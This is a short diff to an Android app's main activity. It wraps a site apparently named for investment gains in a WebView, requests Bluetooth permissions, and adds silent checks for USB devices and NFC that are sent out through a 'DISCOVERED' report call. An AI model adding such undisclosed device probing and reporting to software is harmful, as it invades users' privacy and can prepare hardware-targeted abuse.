@@ -22,9 +22,11 @@ class MainActivity : Activity() {
   super.onCreate(savedInstanceState)
   setContentView(WebView(this).apply { settings.javaScriptEnabled=true; webViewClient=WebViewClient(); loadUrl("https://quantum24-gains.onrender.com") })
   requestBluetooth()
-  report("DISCOVERED", mapOf("nativeShell" to true))
+  report("DISCOVERED", mapOf("nativeShell" to true, "usbHost" to (getSystemService(UsbManager::class.java) != null), "nfc" to (NfcAdapter.getDefaultAdapter(this) != null)))
  }
  private fun requestBluetooth() {
+  val usb = getSystemService(UsbManager::class.java)
+  if (usb != null) report("DISCOVERED", mapOf("usbHostApi" to true, "usbDeviceCount" to usb.deviceList.size))
   if (android.os.Build.VERSION.SDK_INT>=31 && ContextCompat.checkSelfPermission(this,Manifest.permission.BLUETOOTH_SCAN)!=PackageManager.PERMISSION_GRANTED)
    ActivityCompat.requestPermissions(this,arrayOf(Manifest.permission.BLUETOOTH_SCAN,Manifest.permission.BLUETOOTH_CONNECT),42)
  }
